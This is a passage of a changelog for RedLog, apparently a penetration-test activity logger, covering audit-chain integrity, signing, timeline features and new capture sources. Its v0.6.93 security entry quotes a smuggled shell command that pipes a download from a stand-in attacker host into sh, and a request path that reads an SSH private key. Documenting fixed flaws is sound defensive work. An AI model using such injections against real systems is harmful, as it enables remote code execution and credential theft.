- `json.dumps(v, ensure_ascii=False, separators=(',',':'))` matches
  `JSON.stringify(v)` byte-for-byte for parsed-JSON payloads (no
  undefined, no functions, no BigInt). End-to-end chain re-verify
  confirmed on the intact-chain test.
- PowerShell spool filename uses `epoch_ms * 1e6` padded to 19 digits,
  matching bash `%s%N`, so drain sort in `main/index.ts` interleaves
  correctly.

Tests: 360 unit (+2 from redlog-verify.test.ts) / 17 e2e / build clean.

## v0.6.93 — 2026-08-05
Security hardening — 7 P0 items from the 5-agent audit that followed
v0.6.92. All chain integrity + attack surface reduction; no user-facing
changes.

### P0-A — NULL prev_hash forgery blocked
- **Where**: `chain-anchor.ts:452-505` (verifyChainFull) + `:757-772`
  (verifyRandomSample)
- **What**: attacker with local DB write could append a forged event with
  `prev_hash=NULL` + hash computed under legacy `shapeV01` (which has no
  `prevHash` field). verifyChainFull's "NULL prev_hash on any row is
  legacy migration" branch returned `ok:true`.
- **Fix**: track `seenNonNullPrevHash` — once the first non-NULL prev_hash
  appears, ANY later NULL is tampering. Sampling verify caches the
  migration-boundary `rowid` via `MIN(rowid) WHERE prev_hash IS NOT NULL`
  and rejects post-boundary NULLs.

### P0-B — Plugin `requires` shell injection closed
- **Where**: `hooks-manager.ts:174-186` + `:235`
- **What**: `execSync(\`which \${cmd}\`)` unquoted; `cmd` came from a
  plugin manifest's `requires[]`, so a malicious manifest like
  `requires: ["nmap; curl attacker/x | sh #"]` executed arbitrary shell.
- **Fix**: `spawnSync(probeCmd, [cmd])` — argv only, no shell layer.

### P0-C — Zip Slip guard actually catches escape
- **Where**: `plugins/marketplace.ts:245, 327-337, +new assertNoTarEscape`
- **What**: `assertInsideDir` only walked INSIDE `scratchDir` — a tar
  entry with `../..` wrote OUTSIDE and never got checked. Prefix compare
  also used bare `startsWith` (`/foo` prefixes `/foobar`).
- **Fix**: new `assertNoTarEscape` runs `tar -tzf` pre-extract to
  enumerate entries and reject absolute paths + any `..` component.
  `assertInsideDir` prefix compare now uses `resolve(root) + sep`.
  Only runs for the default extractor (tests supply in-memory mocks).

### P0-D — /api/terminal/replay arbitrary file read
- **Where**: `api-server.ts:645-680` + `cast-slice.ts:42-46`
- **What**: `castPath` came from an attacker-inserted event's `data`,
  passed straight to `fs.readFileSync`. Any token holder could POST
  `session_start {castPath: "/…/.ssh/id_ed25519"}` and read the file
  via `/api/terminal/replay`.
- **Fix**: canonicalise `castPath` via `path.resolve`, reject anything
  not `isInsideDir(<project>/casts)`.

### P0-E — CORS `*` + Host allowlist
- **Where**: `api-server.ts:265-296`
- **What**: `Access-Control-Allow-Origin: *` on every response +
  no Host validation → DNS rebinding surface against 127.0.0.1.
- **Fix**: reflect Origin only for `app|file|http://localhost|127.0.0.1|[::1]`;
  reject any `Host` header outside `localhost / 127.0.0.1 / [::1]` with
  400 "bad host".

### P0-F — Append-only trigger covers every hash-contributing field
- **Where**: `db/events.ts:60-88` (`assertEventsAppendOnly`)
- **What**: trigger only listed `hash, prev_hash, data, id, timestamp,
  operator_id` — silently allowed UPDATE of `agent_type, hostname,
  session_id, engagement_id, source_ip, target_id, monotonic_ns,
  ntp_offset_ms, created_at, signature`. Chain hash catches these
  eventually but the append-only doc claim overstated coverage.
- **Fix**: DROP + CREATE (not IF NOT EXISTS) every project open so DBs
  installed pre-v0.6.93 get the extended column list. Idempotent.

### P0-G — cast-slice oversized bail
- **Where**: `cast-slice.ts:42-46`
- **What**: `oversized` flag was computed but `readFileSync` ran anyway —
  a 500 MB cast OOM'd the main process. Cap is 50 MB (matches write-
  time cap in terminal-manager); anything beyond is either attacker-
  planted or a corrupted install.
- **Fix**: `if (stat.size > MAX_CAST_BYTES) return null`. Tests still
  assert `truncated:false` via a small shim.

### Test updates
- `test/signing.test.ts`: tamper-signature test now DROPs the trigger,
  UPDATEs the signature, then reruns verify — simulates the "attacker
  bypassed the trigger via direct sqlite3 CLI" scenario. Trigger
  gets recreated on next `initDB`.

Tests: 358 unit / 17 e2e / build clean.

## v0.6.92 — 2026-08-05
W 專題 — 4 new capture sources, backend only. Grill Q7 option D.

### A. DNS query/response via mitmproxy addon
- `hooks/mitmproxy-addon.py` extended with `dns_message()` handler
- Requires `mitmproxy --mode dns@53` (or `dns@5353` non-priv) in addition
  to the existing HTTP mode; both handlers coexist
- Events: `agent_type: 'dns'` — `dns_query` + `dns_response` with `_causes`
  linking back to the query event (per-flow-id map like the HTTP addon)
- `data`: `query_name, query_type, query_id, transport, source_addr,
  response_code, answers[], duration_ms`
- Timeline `dns` lane already existed; extended `eventTitle` to render
  `DNS ⇒ example.com A` / `DNS ⇐ example.com A → 93.184.216.34 (5ms)`
- Removed `dns` from `EXTERNAL_ONLY_LANES` — it has a producer now

### B. Browser console via CDP
- `src/main/services/cdp-connector.ts` extended: HTTP-poll for tab list
  unchanged; NEW per-tab WebSocket subscription to `Runtime.consoleAPICalled`
  + `Runtime.exceptionThrown` + `Log.entryAdded`
- New `ws` npm dep (Node 20 in Electron 33 doesn't have reliable global
  `WebSocket`)
- Events: `agent_type: 'browser'`, subtypes `console_log / console_warn /
  console_error / console_info / console_debug / exception / log_entry`
- `data`: `url, host, tab_id, message, level, source, line_number, stack_trace`
- **500 ms dedup** on `(url, message, level, line_number)` — kills React
  dev-mode warning spam
- **Caps**: 2 KB message, 100-line stack
- **New Timeline lane `browser`** (color #f97316, between scanner + dns)
- Skips `about:blank / chrome:// / chrome-extension://`

### C. File I/O via chokidar
- New `chokidar` npm dep (cross-platform, well-maintained)
- New service `src/main/services/file-watcher.ts` + config
  `fileWatcher: { enabled, watchPaths[], ignorePatterns[] }`
- Opt-in (default off). Emits `agent_type: 'file_transfer'` with
  `data.source: 'file-watcher'` + subtypes `file_created / file_modified /
  file_deleted`
- Uses chokidar's `awaitWriteFinish: 500ms` to coalesce editor partial
  writes into single events; caps `depth: 8` on watchers
- Built-in ignore defaults: `node_modules/, .git/, dist/, out/, build/,
  .DS_Store, *.swp, *.swo, *.tmp, .#*, .redlog/`
- Settings UI: new File Watcher section (enable toggle + watch paths list
  + ignore patterns list)

### D. Process spawn tree — macOS/Linux via ps polling
- New service `src/main/services/process-monitor.ts`
- Polls `ps -eo pid,ppid,etime,command` every 500 ms; pid-diff algorithm
  emits `process_spawn` / `process_exit`
- Windows: emits one-shot `system.process_monitor_unsupported` advisory
  (visible reason why the lane stays empty)
- **New Timeline lane `process`** (color #f472b6, between scope + system)
- Budget: 1000 events/min. Overflow emits single
  `system.process_monitor_saturated` with the count instead of drowning
- Ignore self + Electron/redlog/node processes to avoid loops
- `ppid → REDLOG_TERMINAL_ID → session_start` correlation is a stub
  (`findCauseSession`) — reliable mapping needs SIP-elevated ptrace on
  macOS; kept as a hook so future release can fill it in without changing
  the emit surface

### Capture health integration
- `capture-health.ts` now tracks all 4 sources: `dns`, `browser-console`,
  `process-monitor`, `file-watcher`
- Contribute to `partial` / `dark` verdicts + Dashboard CaptureHealthCard
  rows

### Tests
- `test/process-monitor.test.ts` — 10 tests: `parsePsLine()` /
  `diffProcs()` (spawn/exit, ignore list, pid reuse race, mixed diffs)
- `test/file-watcher.test.ts` — 5 tests: lifecycle state machine

### Design notes
- **DNS `_causes`**: mitmproxy addon reads the RedLog API's 201 response
  body (the full event) to grab the query's event id, then stamps
  `_causes: [query_id]` on the response event
- **Browser color collision**: `#f97316` matches `loot` — legend clash
  noted, follow-up welcome
- **Process→shell correlation stub**: `findCauseSession()` returns null
  today; Timeline-side wall-clock proximity is the fallback until
  ptrace-based mapping lands
- **File watcher IPC**: reuses existing `config:save` flow instead of a
  dedicated `fileWatcher:configure` handler — matches how clipboard +
  screenshot restart on config change

### Verified
- macOS (Darwin 25.6.0) — full path
- Linux — same POSIX `ps` flags, should work; not tested
- Windows — only the unsupported-advisory branch exercised

Tests: **358 unit** (+15 from new tests) / 17 e2e / build clean.

## v0.6.91 — 2026-08-05
Timeline UX bundle — the 7 items from the `/grill-me` session's Q9/Q10
axes. All renderer / IPC; no chain touch.

### `/` inline search
- Press `/` (not in an input) → header search input opens.
- Filters events by `command / url / host / title / subtype / marker
  title / operator id` (case-insensitive substring).
- Non-matches dim to opacity 0.15.
- Escape clears + closes.
- Persist last query in `localStorage[redlog-timeline-filter-query]`.
- Mutually exclusive with focus chain mode + anomaly filter.

### Follow mode
- Auto-scroll when at right edge and new events arrive.
- Header badge `🔴 LIVE` when at right edge / `⏸ Xm behind` otherwise.
- Click badge → jump to now + re-enable follow.
- `⏸/▶` toggle in the badge area.
- Persist in `localStorage[redlog-timeline-follow-mode]`.

### ⌘K fuzzy palette
- Global ⌘K (or Ctrl+K) opens a centered modal fuzzy searcher — but
  only in Timeline view; other views still route ⌘K to the sidebar
  Search (via new `redlog-timeline-palette` custom event).
- Search across events + markers + operator names + hosts.
- Substring scorer (earlier position wins, newer timestamp tiebreak).
- `↑/↓/Enter/Esc` + hover highlight.

### Bookmarks / saved views
- Per-project `views.json` at `<projectPath>/views.json`.
- New IPC: `views:list / views:save / views:delete` in
  `src/main/index.ts` (+ preload wrapper + env.d.ts types).
- Timeline header "Views" dropdown: save current state (name, zoom,
  timeStart/timeEnd, hiddenLanes, filterQuery), restore on click,
  delete via ⋯ menu.

### Session boundary dividers
- Vertical dashed lines at every terminal session start/end with
  `term-<id.slice(0,4)>` label + faint lane-tinted band between them.
- Diagonal-striped background for every recording paused↔resumed pair
  with `⏸ paused` label.
- Toggle in header, default on. Persist in
  `localStorage[redlog-timeline-session-dividers]`.

### Timezone toggle
- Header dropdown: Local / UTC / Project-configured
  (`config.engagement.timezone`).
- New `formatTs(ms, tz, projectTz, style)` helper routes every
  timestamp render (axis ticks, cluster popover, event list, detail
  panel timestamp).
- Invalid IANA name → silent fallback to Local.
- Project option disabled when unset.
- Persist in `localStorage[redlog-timeline-tz]`.

### Persistent state extension
Added to the existing localStorage bag:
- `redlog-timeline-filter-query`
- `redlog-timeline-follow-mode`
- `redlog-timeline-session-dividers`
- `redlog-timeline-tz`
- `redlog-timeline-focus-event` (selected event id restored on first mount)
- `redlog-timeline-zoom`
- `redlog-timeline-hidden-lanes`

### Notable design decisions
- **Shared dim mode via effects, not enum** — focus / anomaly / `/`
  filter each have heterogeneous payloads; three effects clear the
  other two on activation instead of a single `dimMode` union.
- **Session boundary reconstructs start time from `session_end.data.durationMs`**
  because `shell.session_start` is filtered by `isHousekeeping`.
- **Follow mode has 10px slop** for `atRightEdge` detection + a
  1-second `now` tick to keep "⏸ Xm behind" live between event
  arrivals.
- **Views IPC preload wrapper is optional** in the type contract so
  the smoke-test bridge (which doesn't mock `views`) still renders;
  Timeline detects missing API and disables the dropdown gracefully.

Tests: 343 unit / 17 e2e / build clean.

## v0.6.90 — 2026-08-05
Timeline `_causes` visualisation UI — the frontend companion to v0.6.89's
backend producer wiring. UX bundle (`/`-search / follow / ⌘K / bookmarks /
tz toggle / session dividers) shifts to v0.6.91.

### Detail-panel chips
- **`▶ Caused by`**: renders `data._causes` as clickable chips using the
  in-memory event map. Chip click → jump + focus the referenced event.
- **`▼ Effects (N)`**: reverse-computed on mount by iterating all events;
  shows up to 20 chips + `+M more effects` footer beyond that.
- **Broken-link tag**: when a `_causes` id doesn't resolve (event
  sanitized / not loaded / forged), chip renders red with
  `event <id.slice(0,8)>… not found — chain broken`.

### Focus chain mode
- Press **`f`** to enter focus mode: anchors on the selected event,
  BFS-walks `_causes` upstream + `effectsById` downstream (depth 20).
- Non-chain events dim to opacity 0.15; chain events keep normal opacity
  + get a slim ring in the anchor's lane color.
- Top-right badge `🔗 Focus chain (N events)` + `×` to exit; `f` or
  Escape also exits.
- Anchor id persisted in `localStorage[redlog-timeline-focus-anchor]`;
  restored on mount if the event still exists in the map.

### Anomaly badges on event dots
- `⚠` `_clock_anomaly` · `🔄` `recovered` (orphan session) · `📮` `recovered_from_spool` · `🗑️` `screenshot_deleted / cast_pruned / screenshot_pruned` · `⚓✗` `anchor_failed` · `⛓️‍💥` chain broken (from full verify)
- Tiny bubble on top-right corner of the dot; full list + reasons on
  hover tooltip; also rendered as a chip row in the detail panel.

### Anomaly filter chip
- Header chip `⚠ Anomalies (N)` — click to filter Timeline to only
  events with any badge; non-matches dim to opacity 0.15.
- Mutually exclusive with focus chain mode (enabling one clears the
  other).
- Persisted in `localStorage[redlog-timeline-anomaly-filter]`.

### Broken-chain highlighting after full verify
- New `src/renderer/src/lib/verifyResultCache.ts` — module-level cache
  for the last `FullVerifyResult`. Settings' Verify button writes to
  it + dispatches a `redlog-timeline-verify-updated` window event.
- Timeline reads on mount + on event; when `brokenAtEventId` is set:
  - `⛓️‍💥` badge on the broken row
  - Faint red-tinted band behind all events with `createdAt >= brokenEvent.createdAt`
  - Top banner `⛓️‍💥 Chain broken at event <id.slice(0,8)>…` with a
    Dismiss button (state-only dismiss; cache stays; next mount shows
    the banner again unless a fresh verify passes)

Tests: 343 unit / 17 e2e / build clean.

## v0.6.89 — 2026-08-05
Chain-integrity backend release. Design decisions from the exhaustive
`/grill-me` session locked here + shipped. Timeline UI for `_causes`
visualisation (detail chips + focus chain mode + anomaly badges +
broken-chain highlight) explicitly deferred to v0.6.89.5 to keep this
release testable in one bite.

### `_causes` causal-link model (Q3–Q6)
- **Every event carries an optional `data._causes: [event_id]` array.**
  Hashed by the canonical serialisation (v0.6.88 P0-A) so causality is
  tamper-evident. Old events not backfilled.
- **12 producers wired** (Tier 1 + Tier 2):
  - `shell.command_end._causes = [command_start.id]` via api-server
    in-memory map keyed on `(terminal_id, pid, command)`
  - `scanner.http_response / http_error / http_request_dropped._causes = [http_request_start.id]` via `flow_id` map
  - `shell.session_end._causes = [session_start.id]` (terminal-manager tracks startEventId per session)
  - `system.screenshot_deleted._causes = [source_screenshot.id]` (rename of existing `source_event`)
  - `system.cast_pruned._causes = [session_end.id]` (retention.ts looks up by castPath)
  - `system.screenshot_pruned._causes = [screenshot.id]` (same lookup by filename)
  - `loot._causes = [command_end.id]` — loot detector split into
    `findMatches()` + `emit()`; api-server calls `findMatches` for the
    redaction denylist, then `emit()` after the shell event is inserted
    so `_causes` points at the right row
  - `pivot / cleanup / file_transfer / pivot(close)._causes = [shell_event.id]`
  - `screenshot._causes = [marker.id]` when the screenshot was triggered
    by ⌘⇧M — marker id flows through `screenshot.capture(causeEventId)`
- New `src/core/causes-resolver.ts` for the api-server maps (bounded 10k
  entries with LRU eviction — matches mitmproxy's 5-min TTL).

### Per-event Ed25519 signature (v0.6.88 deferred P0-C)
- **Keys at `~/.redlog/keys/<operator_id>.key` + `.pub`** (mode 0600 on
  POSIX), overridable via `REDLOG_KEYS_DIR` for tests.
- **Signature covers the canonical JSON** (same input the hash covers) —
  raw 64-byte Ed25519 signature stored as base64 in new `events.signature`
  column (nullable, no backfill).
- **Public key stored in `operators.signer_pub_key`** — verify never
  needs disk access to walk history.
- **Auto-keygen** on `createOperator` + backfill on `updateOperatorToken`
  when the operator's `signer_pub_key` is null (rotation moment reads
  as "operator touched their account").
- **`verifyChainFull` walks each row's signature** — rows with sig +
  operator pubkey verify; missing sig/pubkey → `unsignedCount++` (not a
  failure); failed sig → hard fail with `brokenAtEventId` set.
- New file `src/core/signing.ts`. Uses Node's built-in `crypto` via JWK
  (no new deps).

### Read-path sampling verify (v0.6.88 deferred P1-A)
- **`verifyRandomSample(count = 50)`** in `chain-anchor.ts`: picks K
  random rows, verifies hash + prev_hash link (skips null prev_hash
  legacy migration state).
- **On project open**: runs a 100-sample. On failure, pins
  `capture:health` verdict to `dark`, emits `system.chain_sample_broken`
  audit event.
- **Every 5 minutes**: runs a 50-sample.
- **`capture:health` extended**: `lastSampleBroken` (60-min TTL) +
  `lastSampleOkAt`. Broken sample beats DB write failure in verdict
  precedence (chain tamper is worse than a live write error).
- **Dashboard** events StatCard sub-line appends `· sampled Xm` (or
  `· sample BROKEN` in red) after the existing `· ⚓ Xh` anchor age.

### stdout / stderr split (X)
- **New `redlog-run` bash function** in `hooks/shell-preexec-hook.sh`:
  wraps a command, splits stdout/stderr into temp files, emits
  `command_end` with structured `stdout / stderr / stdout_bytes / stderr_bytes / stdout_truncated / stderr_truncated` fields (100 KB cap each). Passthrough
  to the operator's terminal preserved.
- **Standard preexec/precmd flow unchanged** — POSIX shells can't cleanly
  split streams from preexec so the wrapper is opt-in.
- **api-server loot detector now scans stdout + stderr + legacy output**;
  redaction loop also covers the new fields.
- **Timeline detail panel**: `CollapsibleStream` component with colored
  disclosure header (emerald / amber / zinc), byte badges via `formatBytes`,
  truncation warning, "Copy full" for >4 KB content. `MetadataGrid`
  shows exit_code / duration_sec / cwd / pid / terminal_id / source.
  Legacy captures render in a "output (mixed)" section — no regression.

### Deferred to v0.6.89.5
- Detail-panel `▶ Caused by / ▼ Effects` chips + click-to-jump (Q4 A)
- Focus chain mode (`f` shortcut — Q4 D)
- Anomaly badges on event dots (T1)
- Anomaly filter chip (T2)
- Broken-chain highlighting after full verify (T3)

Tests: 343 unit (+16 vs v0.6.88 — sampling + signing) / 17 e2e / build clean.

## v0.6.88 — 2026-08-04
Audit-log integrity batch — 6 of 8 planned items landed. Per-event Ed25519
signature (P0-C) and read-path sampling verify (P1-A) deferred to v0.6.89 —
both need proper key-management + test infra design.

### P0 — chain integrity
- **Canonical JSON hash** (`src/core/db/events.ts` `canonicalStringify`):
  new events hash over sorted-key serialisation instead of insertion-order
  `JSON.stringify`. Export/import round-trips no longer risk hash mismatch
  from key reordering. Additive — verifyChainFull tries the canonical shape
  first, falls back to the legacy JSON shapes for pre-v0.6.88 rows. No
  migration needed.
- **`/api/events` strips forged operator id** (`src/core/api-server.ts`):
  any `operator_id` / `operatorId` in the request body or `data` payload
  is deleted before hashing; the operator is resolved solely from the
  Bearer token. A warning line lands in stderr with the offender's remote
  address for later attribution.

### P1 — anti-tamper
- **Append-only enforcement** (`src/core/db/events.ts` `assertEventsAppendOnly`,
  `db/index.ts`): SQLite triggers `no_delete_events` + `no_update_events_hash`
  installed on every `initDB`. `DELETE FROM events` or `UPDATE` of any
  immutable field (`hash`, `prev_hash`, `data`, `id`, `timestamp`,
  `operator_id`) now raises `RAISE(ABORT, …)` instead of silently
  corrupting the chain. Idempotent — replays are safe.

### P2 — observability
- **Insert-time clock-anomaly producer** (`src/core/db/events.ts`
  `detectClockAnomaly`): NTP offset > 30s or monotonic-ns regression
  within the same session or wall-clock backwards jump > 60s → the anomaly
  is stashed in `data._clock_anomaly` before hashing so a later attacker
  can't strip it without a hash mismatch. verifyChainFull picks it up and
  Timeline can visually flag the row.
- **OTS anchor failure logging** (`src/core/chain-anchor.ts`): when
  `anchorNow` returns status='failed' (all calendars rejected), a
  `system.anchor_failed` audit event lands so the chain records why the
  anchor didn't renew (deliver bundles carry the reason).
- **Dashboard last-anchor-age badge** (`src/renderer/src/App.tsx`):
  events StatCard sub-line now shows `⚓ 3h` (green <2h, amber <24h, red
  24h+ or last status=failed). Polls every 60s + on new event. Operators
  spot a stalled OTS submission at a glance.

### P3 — ordering
- **Session-cross monotonic prefix** (`src/core/db/events.ts` `padMonoNs`):
  monotonic_ns now lands as `${bootMsPad14}-${nsPad20}` (35 chars). SQL
  `ORDER BY monotonic_ns` sorts by boot-epoch first, then in-process ns,
  so events across app restarts no longer mis-order. verifyChainFull's
  clock-anomaly detector strips the prefix before comparing; cross-process
  comparisons skip anomaly detection entirely (they're not comparable).

### Deferred to v0.6.89
- **P0-C: per-event Ed25519 signature** — needs per-operator key-store
  design (OS keychain? file-based? key rotation?) and rework of chain-verify
  to check signatures. Would be ~500 LoC + tests.
- **P1-A: read-path sampling verify** — needs threshold picking, periodic
  loop design, verdict wiring into `capture:health`. Would be ~300 LoC.

Tests: 327 unit / 17 e2e / build clean.

## v0.6.87 — 2026-08-04
Twelve UX + hygiene items in one release: 5 remaining audit fixes, 2
retention sweeps, right-click Timeline marker, Timeline slice export,
session replay scrubber, in-app full-chain verify, and the
mitmproxy addon split into request-start + response events.

### A — audit remainders
- **NTP clock-jump-backward pager fix** (`src/core/db/events.ts`,
  `Timeline.tsx`): pager now anchors on `created_at` (monotonic within a
  run) instead of `min(timestamp)` (wall-clock — can regress on NTP
  correction). New `queryEvents({ beforeCreatedAt })` param.
- **Shell hook local spool** (`hooks/shell-preexec-hook.sh`,
  `src/main/index.ts`): commands run in an external shell while RedLog is
  closed spool to `~/.redlog/pending/*.json` (capped at 5000 files) and
  replay on next project open with `data.recovered_from_spool=true`.
- **MCP operator id configurable** (`src/main/index.ts`, Settings):
  `mcp:setupToken({ name? })` now accepts a per-agent name that becomes
  `mcp-<slug>`, so Claude Desktop, OpenCode, Codex, etc. each get their
  own operator + attribution. `mcp:info` returns the registered agent list.
- **`sessionId` regenerates per project open** (`src/core/db/index.ts`,
  `events.ts`): `resetSession()` fires from `initDB` so events written after
  a project switch belong to a fresh session.
- **Orphan-session recovery paginate** (`terminal-manager.ts`): replaced
  the 5000-row-double-query with a `LEFT JOIN` NOT EXISTS SQL, so big
  engagements with many terminal sessions get every orphan.

### B — retention
- **`.cast` + screenshot retention sweep** (`src/core/retention.ts` new,
  `config.ts`): opt-in `terminal.castKeepDays` + `screenshots.keepDays`.
  Sweep runs on project open. Event row stays in the chain; per-deletion
  audit event `system.cast_pruned` / `system.screenshot_pruned` records
  the removal.

### C — Timeline UX
- **Right-click Timeline background → drop marker at timestamp** (`Timeline.tsx`,
  `EventMarker.tsx`, `App.tsx`): the marker is created at `Date.now()`
  (chain honesty) with `data.atTimestamp` carrying the target moment.
  Marker rows render at `atTimestamp` on the Timeline via new `displayTs()`.
- **Timeline slice export** (`data:exportTimelineSlice` IPC): "⬇ Export slice"
  header button captures the current minimap viewport as
  `exports/redlog-timeline-<ts>.json` (events + window bounds). Bug-bounty
  writeups get attack-moment evidence with one click.

### D — replay
- **Session replay scrubber** (`Timeline.tsx` `SessionReplayPlayer`): xterm-
  backed replay with Play/Pause, seek bar, ±5s, 0.5×/1×/2×/4× speed, elapsed
  vs total timestamp. Idle gaps capped at 3s/speed so long AFK stretches
  don't freeze the player. ANSI escapes render properly (was ANSI-stripped
  `<pre>` before).

### E — audit UX
- **In-app full-chain verify** (Settings ▸ Audit): new "Verify full chain"
  button walks every event, recomputes each hash, checks `prev_hash`, and
  displays a detail card: walked count, broken-at (if any), current head,
  anchor-match, clock-anomaly count. Delivery-ready.

### F — mitmproxy split
- **`http_request_start` + `http_response` events** (`hooks/mitmproxy-addon.py`):
  request no longer waits for response — Timeline shows in-flight requests
  the moment they leave. Request-body preview captured on the start event.
  `error()` handler now includes `duration_ms`.
- **TTL sweep for orphaned flows** (5min): when a request never gets a
  response or error (TCP RST, client cancel, mitmproxy killed), the sweep
  emits `http_request_dropped` with `age_sec` so the audit log records the
  gap. Timeline `case 'scanner'` renders all four subtypes distinctly.

Tests: 327 unit / 17 e2e / build clean.

## v0.6.86 — 2026-08-03
Timeline recording pipeline round 2 — data-quality (P1) + perf (P2) +
observability (P3). All ten audit follow-ups from v0.6.85's review landed.

### P1 — data quality
- **`isHousekeeping` pushed to SQL** (`src/core/db/events.ts`): renderer used
  to fetch 200 rows and filter to ~30 visible client-side, which meant the
  pager marked itself "all loaded" every time fewer than 200 came back.
  New `queryEvents({ excludeHousekeeping: true })` applies a `HOUSEKEEPING_SQL`
  predicate at the DB layer; Timeline uses it for both initial + paginated
  fetches. +1 regression test.
- **Cross-source shell↔agent dedup**: a Claude Code hook (`agent`) shelling
  out to `ls` also got caught by `shell-preexec-hook.sh` (`shell`),
  producing two rows for the same intent. Dedup now matches across
  `('shell','agent')` when `(command, subtype, terminal_id)` or
  `(command, subtype, pid)` line up within 2 s. Unrelated agents running
  the same command at the same time are NOT collapsed (different pid/tid).
  +3 regression tests.
- **`monotonic_ns` padded to 20 chars**: SQLite TEXT ORDER BY is
  lexicographic, so `'999' > '1000'`. Now padded with leading zeros so
  SQL sort is numeric. Renderer already compared as BigInt — this only
  affects SQL. Covers ~317 years. +1 test.

### P2 — perf
- **rAF-coalesced onNew in Timeline**: was doing
  `Array.from(map.values()).sort()` per incoming event; a ~100 events/s
  mitmproxy burst with 5k loaded ≈ 40k comparisons per event and 100
  React renders per second. Now the handler just drops into the map and
  schedules a single rebuild-and-render per animation frame.
- **`queryScopeFilteredEvents` SQL predicate**: pushed the "no target and
  not on the allow-list" filter down to SQL rather than loading 100k rows
  into memory to drop most of them. Pattern matching for user-supplied
  scope patterns stays in JS.

### P3 — observability
- **StatusBar toasts on capture-health degradation**: on the first
  `healthy → partial/dark` transition after mount, fires a warning toast
  with the failing source and (if a DB error is live) the truncated
  message. Previously the operator had to be looking at the tiny colour
  dot to notice.
- **DB write failures surface in `capture:health`**: the bare `catch {}`
  in clipboard-monitor, screenshot-agent, cdp-connector, and
  `finaliseSession` (terminal-manager) previously ate SQLITE_BUSY /
  disk-full / project-closed silently. Each now forwards to
  `noteDbError(source, err)`; a live error (within 60 s TTL) pins the
  verdict to `dark` and shows up on the StatusBar tooltip.
- **Orphan-session recovery on project open**: scans for
  `shell.session_start (source=builtin-terminal)` rows without a matching
  `session_end` and writes a synthetic `session_end` tagged
  `recovered=true`. Recovers the audit chain's close signal when the
  prior app run crashed or was force-killed mid-write.
- **External-only lane chip tooltip**: `dns` / `credential_use` /
  `c2_checkin` had no built-in producer, so their disabled chips read as
  "empty" — misleading. New tooltip explains they're only populated by
  external agents via `/api/events`. Adds `timeline.laneExternalOnly`
  i18n string.
- **`event-registry` wired to Timeline lanes**: was a dead facade — a
  plugin registering `{ agentType: 'burp', lane: 'scanner' }` still had
  its rows bucketed into `system`. Timeline now queries
  `plugins.eventTypes()` on mount and threads the mapping through
  `toLane()`.

Tests: 327 unit (was 322, +5) / 17 e2e / build clean.

## v0.6.85 — 2026-08-02
Timeline recording pipeline audit fallout: 1 P0 data-loss bug + 2 P1
surface bugs + 5 P2 UX/correctness items.

### P0 — data-loss (verified)
- **Shell dedup dropped `command_end` for fast commands** (`src/core/db/events.ts`):
  the 2000 ms `data LIKE '%"command":"..."%'` dedup matched on the raw JSON
  blob without regard for subtype. A `command_end` fired ~10 ms after
  `command_start` looked like a duplicate, so `insertEvent` returned `null`.
  Downstream damage: `collapseCommandPairs` never fired (Timeline showed an
  in-flight `$ ls` with no exit code), `/api/terminal/replay` broke, pivot-
  close detection broke. Fix: key structurally on
  `(subtype, command, terminal_id)`; parse each candidate row's JSON and
  compare fields exactly. +2 regression tests (`test/events.test.ts`).

### P1 — silent-fail surfaces
- **`eventBus.pause()` now actually gates ambient capture writes.** Previously
  it only muted the IPC broadcast — clipboard, screenshot (periodic), and CDP
  navigation kept writing to the DB during "recording paused". Gated at the
  three ambient sources (`clipboard-monitor.ts`, `screenshot-agent.ts` —
  manual captures still land — and `cdp-connector.ts`). Audit chain writes
  (markers, session boundaries, hook-driven shell events) still land, which
  is the intended semantic.
- **StatusBar recording dot reflects capture-health.** Was always a pulsing
  red regardless of whether any source was actually feeding events. Now
  polls `capture:health` every 30 s and colors the dot: red pulsing =
  healthy, amber pulsing = partial (some sources idle 10+ min), solid amber
  = dark (nothing has fed events). Tooltip explains the cause. Adds
  `statusBar.captureDark` / `statusBar.capturePartial` i18n strings.

### P2 — UX / correctness
- **New `scanner` lane** (`Timeline.tsx`): mitmproxy `http_request` /
  `http_error` events were falling into the `system` housekeeping lane
  (violet, positioned after `http_navigation`). Adds `timeline.scanner` label.
- **Cluster popover cap** — a mitmproxy burst filled the popover with
  thousands of buttons. Capped at 50 items with a "+N more — zoom in to see
  individually" footer.
- **Cluster-jump zoom is span-relative** — was hardcoded 8×, which
  over-zoomed 5-event bursts and under-zoomed 500-event ones. Now computes
  from the cluster's own time span so every burst splits cleanly.
- **Popover viewport clamp** — was clamped only to `TRACK_W`, so on a
  wide-zoom track the popover could render off-screen. Now clamps against
  the visible scroll window (`scrollLeft + clientWidth`).
- **Ordering: monotonic-ns tiebreak** — sort was wall-clock only, so two
  events sharing a millisecond had implementation-defined order and could
  swap between page loads. Comparator now falls back to `monotonic_ns`
  (compared as BigInt), then event id. Renderer `RedLogEvent` type gains
  `monotonicNs` + `ntpOffsetMs`.
- **`<TimelinePanel key={project.id}>`** — a mid-session project switch (once
  the in-app switcher lands) would have leaked `eventsMapRef` across projects;
  keyed remount prevents it.

322 unit / 17 e2e / build clean.

## v0.6.84 — 2026-08-02
Timeline UX fixes surfaced from user testing + a matching E2E expansion so
the two clicked-through bugs stay fixed.

- **Cluster popup click regression fixed** (`Timeline.tsx`): the
  scroll-track `mousedown` handler was closing the popup and starting a
  drag on the same mousedown that would have led to the popup
  button's `click`, so the click never fired. The handler now bails
  when the target is inside `[data-timeline-popup]` (added to the
  popup container), and lets React's synthetic click deliver
  normally. This is the "點擊後不會轉跳到該項目" bug the user
  reported twice.
- **Resizable detail panel** (`Timeline.tsx` + i18n): the bottom
  detail panel now has a 4-px drag handle above it (cursor: row-resize)
  that persists the chosen height to `localStorage`
  (`redlog-timeline-detail-h`). Double-click resets to default.
  Bounds: 80 – 2000 px.
- **E2E flow coverage (11 → 17)**: new `e2e/recording-flow.spec.ts`
  (+3 tests: recording start/stop lifecycle + StatusBar reflection),
  extended `marketplace-flow.spec.ts` (+1: publisher auto-fill banner),
  extended `cloud-share-flow.spec.ts` (+2: HTTPS backend persistence +
  inline error surface). Adds `marketplace:testSetIndex` IPC gated on
  `REDLOG_E2E === '1'` plus targeted `data-testid` attributes on
  StatusBar/Settings so specs anchor on stable selectors.
- unit tests: 320 pass / e2e: 17 pass / build clean.

## v0.6.83 — 2026-08-01
Closes 4 of 5 P2 Windows audit items and adds targeted regression tests
for the v0.6.82 P0/P1 fixes so a future Windows CI run catches drift.

- **shell/install.ps1** (new): PowerShell counterpart to `install.sh`.
  Writes `%USERPROFILE%\.redlog\shell-hook.ps1` and prints the exact
